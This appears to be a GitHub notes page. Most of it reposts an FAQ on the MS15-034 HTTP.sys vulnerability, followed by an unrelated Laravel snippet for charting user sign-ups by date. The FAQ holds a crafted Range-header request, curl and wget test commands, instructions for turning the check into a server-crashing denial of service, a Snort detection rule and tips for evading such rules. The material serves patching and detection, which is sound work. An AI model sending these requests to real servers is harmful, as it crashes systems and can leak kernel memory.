IIS-Vulnerability_MS015
MS15-034: Vulnerability in HTTP.sys could allow remote code execution: April 14, 2015
Summary
This security update resolves a vulnerability in Microsoft Windows. The vulnerability could allow remote code execution if an attacker sends a specially crafted HTTP request to an affected Windows system. The security update addresses the vulnerability by modifying how the Windows HTTP stack handles requests.
```bash
GET /%7Bwelcome.png HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: [server-ip]
Connection: Keep-Alive
Range: bytes=18-18446744073709551615
```
===========================

FAQ

1 - Which Versions of Windows Are Vulnerable?
Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1, and Windows Server 2012 R2. HTTP.sys is used by any version of IIS running on one of these operating systems. HTTP.sys was introduced with IIS 6.

2 - Will an IPS protect me?
Yes. If you have the right rules installed. For example, here is a simple rule for Snort:

alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg: " MS15-034 Range Header HTTP.sys Exploit"; content: "|0d 0a|Range: bytes="; nocase; content: "-"; within: 20 ; byte_test: 10,>,1000000000,0,relative,string,dec ; sid: 1001239;)

(byte_test is limited to 10 bytes, so I just check if the first 10 bytes are larger then 1000000000)

Watch out, there are some tricks to bypass simple rules, like adding whitespace to the Range: header's value. More info here.

3 - Will the exploit work over SSL?
Yes. Which may be used to bypass your IDS or other network protections

4 - Have you seen active exploits "in the wild"?
Not yet. We have seen working DoS exploits, but have not detected them in our honeypots. Erratasec conducted a (partial) scan of the Internet using a non-DoS exploit with the intend to enumerate vulnerable systems.

5 - How do I know if I am vulnerable?
Send the following request to your IIS server:

GET / HTTP/1.1 Host: MS15034 Range: bytes=0-18446744073709551615 If the server responds with "Requested Header Range Not Satisfiable", then you may be vulnerable.

Test Scripts:

(powershell removed as it doesn't support 64 bit intergers... worked without error for me, but something else may have been wrong with it)

curl -v [ipaddress]/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"

wget -O /dev/null --header="Range: 0-18446744073709551615" http://[ip address]/

6 - Can this vulnerability be exploited to do more then a DoS?
In it's advisory, Microsoft considered the vulnerability as a remote code execution vulnerability. But at this point, no exploit has been made public that executed code. Only DoS exploits are available. There also appears to be an information disclosure vulnerability. If the lower end of the range is one byte less then the size of the retrieved file, kernel memory is appended to the output before the system reboots. In my own testing, I was not able to achieve consistent information leakage. Most of the time, the server just crashes.

[Turns out, the file does not have to be > 4GB. Tried it with a short file and it worked. The >4GB information came from a bad interpretation of mine of the chinese article in the "Resources" section]

7 - How to I launch the DoS exploit?
In the example PoC above, change the "0-" to "20-". (has to be smaller then the size of the file retrieved, but larger then 0)

8 - What is special about the large number in the PoC exploit?

It is 2^64-1. The largest 64 bit number (hex: 0xFFFFFFFFFFFFFFFF)

9 - Any Other Workarounds?
In IIS 7, you can disable kernel caching.

10 - Is only IIS vulnerable? Or are other components affected as well?
Potentially, anything using HTTP.sys and kernel caching is vulnerable. HTTP.sys is the Windows library used to parse HTTP requests. However, IIS is the most common program exposing HTTP.sys. You may find potentially vulnerable components by typing: netsh http show servicestate (thx to @Gmanfunky)

11 - Will IIS Request Filtering Protect Me?
No. IIS Request Filtering happens after the Range header is parsed.

References:

https://ma.ttias.be/remote-code-execution-via-http-request-in-iis-on-windows/ https://technet.microsoft.com/library/security/MS15-034 https://support.microsoft.com/en-us/kb/3042553 http://blogs.360.cn/blog/cve_2015_6135_http_rce_analysis (Chinese)

Thanks to Threatstop for providing an IIS server for testing.



***************

![alt text](https://raw.githubusercontent.com/Hadi-Abedzadeh/Practical-mini-codes/master/chart.png?raw=true)

Refrence: https://www.reddit.com/r/laravel/comments/2xeqz2/laravel_and_eloquent_count_with_chartjs/
and for ajax you can use this link: https://dyclassroom.com/chartjs/chartjs-how-to-create-line-graph-using-data-from-mysql-mariadb-table-and-php
Google url was searched: https://www.google.com/search?rlz=1C1GCEA_enIR936IR936&sxsrf=ALeKk03n3HyeFFzwOsmVzcOkoHZ0r4FItw:1621799880602&q=get+data+mysql+by+date+day+to+show+in+chart+js&spell=1&sa=X&ved=2ahUKEwjQ-p2uy-DwAhXPOcAKHeHsCJ4QBSgAegQIARAt&biw=1920&bih=969

keyword was searched: get data mysql by date day to show in chart js

```
//Laravel ORM
$start = '2021-04-12';
$end   = '2021-05-12';

// Get data from period
// $get_date = User::where('created_at', '>=', $start)->where('created_at', '<=', $end)->groupBy(DB::raw('DATE(users.created_at)'))->get([DB::raw('COUNT(*) as count'), DB::raw('DATE(users.created_at) as date')]);
  
// Get data from 7 day ago
// $get_date = User::where('created_at', '>=', DB::raw('DATE(NOW()) - INTERVAL 7 DAY'))->groupBy(DB::raw('DATE(users.created_at)'))->get([DB::raw('COUNT(*) as count'), DB::raw('DATE(users.created_at) as date')]);
// RAW QUERY

// select COUNT(*) as count, DATE(users.created_at) as date from `users` where `created_at` >= '2021-04-12' and `created_at` <= '2021-05-12' group by DATE(users.created_at)

// select COUNT(*) as count, DATE(users.created_at) as date from `users` where `created_at` >= DATE(NOW()) - INTERVAL 7 DAY group by DATE(users.created_at)

dd($get_date);
```

